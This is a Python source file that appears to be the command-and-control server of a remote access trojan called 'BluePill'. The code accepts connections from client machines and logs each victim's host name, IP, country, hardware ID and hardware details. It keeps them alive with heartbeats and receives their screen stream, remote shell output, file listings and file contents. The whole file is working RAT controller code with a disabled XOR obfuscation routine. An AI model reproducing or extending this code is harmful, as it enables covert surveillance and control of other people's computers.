import socket, select, json
from src.add_data import add_new_data
from src.remove_rows import remove_selected_rows
import threading
import time
import zlib
import hashlib
import base64
class BluePill:
    def __init__(self, my_window) -> None:
        self.socket = socket.socket()
        self.active = False
        self.my_window = my_window
        self.encryption_key = self.hashpass('BluePill')

    def hashpass(self, password) -> str:
        return hashlib.md5(password.encode('utf-8')).hexdigest().encode('utf-8')
    
    def initiate_server(self, ip, port):
        self.ip = ip
        self.port = port
        self.active = True
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((ip,port))
        self.socket.listen()
        while self.active:
            server_socket = [self.socket]
            ready, _, _ = select.select(server_socket, [], [], 1)
            if ready:
                conn, addr = self.socket.accept()
                self.my_window.connection.append(conn)
                self.my_window.address.append(addr)
                self.my_window.stream.append(b"")
                self.my_window.command.append(b"")
                self.my_window.remote_window.append(False)
                self.my_window.command_window.append(None)
                self.my_window.file_explorer.append(None)
                self.send(b'BluePillv1.0', conn)
                tcp_data = self.recv(conn)
                print(tcp_data)
                data = json.loads(tcp_data)
                print(data)
                host = data['SYSINFO']['Host Name']
                ip = data['LOCATION']['ip']
                country = data['LOCATION']['country']
                hwid = data['HWID']
                os_name = data['SYSINFO']['OS Name']
                os_version = data['SYSINFO']['OS Version']
                cpu_name = data['CPU']
                gpu_name = data['GPU']
                print(data['DISPLAY'])
                print(type(data['DISPLAY']))
                self.my_window.display_info.append(data['DISPLAY'])
                self.my_window.add_new_data(host, ip, str(addr[1]), hwid, country, os_name, os_version, cpu_name, gpu_name)
                self.start(self.my_window.last_used_id, conn)

    def delete_item(self, item_id):
        row_index = -1
        for index, item in enumerate(self.my_window.items):
            print(item['id'], item_id)
            if int(item['id']) == item_id:
                row_index = index
                break
        if row_index != -1:
            self.my_window.table_widget.removeRow(row_index)
            del self.my_window.items[row_index]

    def start(self, client_id, conn):
        threading.Thread(target=self.heartbeat, args=(self.my_window.last_used_id, conn,)).start()
        threading.Thread(target=self.recv_tcp_data, args=(self.my_window.last_used_id, conn,)).start()

    def recv_tcp_data(self, client_id, conn):
        while True:
            try:
                data = self.recv(conn)
                if data.startswith(b"video->"):
                    self.my_window.stream[client_id-1] = data.split(b"video->")[1]
                elif data.startswith(b"cmd->"):
                    code = data.split(b"cmd->")[1]
                    string = code.decode('utf-8', errors='ignore')
                    self.my_window.command_window[client_id-1].append_text(string)
                    self.my_window.command_window[client_id-1].input_box.clear()
                    time.sleep(0.01)
                elif data == b"STOPCMD":
                    self.my_window.command_window[client_id-1].close()
                elif data.startswith(b"Files->"):
                    directory = data.split(b"Files->")[1].decode()
                    directory = directory.replace("\\", "\\\\")
                    json_data = json.loads(directory)
                    self.my_window.file_explorer[client_id-1].populate_tree_view(json_data)
                elif data.startswith(b"FileError->"):
                    directory = data.split(b"FileError->")[1].decode()
                    print(directory, "THIS IS THE PLaCE")
                    value = self.my_window.file_explorer[client_id-1].value
                    if directory == "ERROR": title = "File Explorer"; msg = "Windows can't find '" + value + "'. Check Spelling and try again."
                    if directory == "PERMISSION": title = value.split("\\")[-1]; msg = "You don't currently have permission to access this folder."
                    print(title, msg)
                    self.my_window.file_explorer[client_id-1].show_error_popup(title, msg)
                    self.my_window.file_explorer[client_id-1].search_box.setText(value)
                elif data.startswith(b"File->"):
                    file_bytes = data.split(b"File->")[1]
                    threading.Thread(target=self.my_window.file_explorer[client_id-1].text_updater.add_text, args=((file_bytes.decode('utf-8', errors='ignore'),))).start()
            except Exception as e:
                print(e, "RECV_TC_DATA")
                break
    def heartbeat(self, client_id, conn):
        # This function checks if the client is alive or not by sending Alive?
        print(client_id, type(client_id))
        while self.active:
            try:
                self.send(b'Alive', conn)
                time.sleep(2)
            except Exception as e:
                print("CLIENT_ ID:",client_id,"removed.")
                self.my_window.connection[client_id-1] = ''
                self.my_window.address[client_id-1] = ''
                self.delete_item(client_id)
                break

    def xor(self, text, key) -> bytes: return bytes([byte^key[i%len(key)] for i, byte in enumerate(text)])
    
    def recv(self, connection):
        data = bytearray()
        length = b""
        while True:
            packet_len = connection.recv(1)
            if packet_len != b" ":
                length += packet_len
            else:
                break
        length = int(length)
        while len(data) < length:
            packet = connection.recv(length - len(data))
            if not packet:
                return None
            data += packet
        return data
        #return self.xor(data, self.encryption_key)

    def send(self, data, conn):
        conn.send(str(len(data)).encode('utf-8') + b' ' + data)
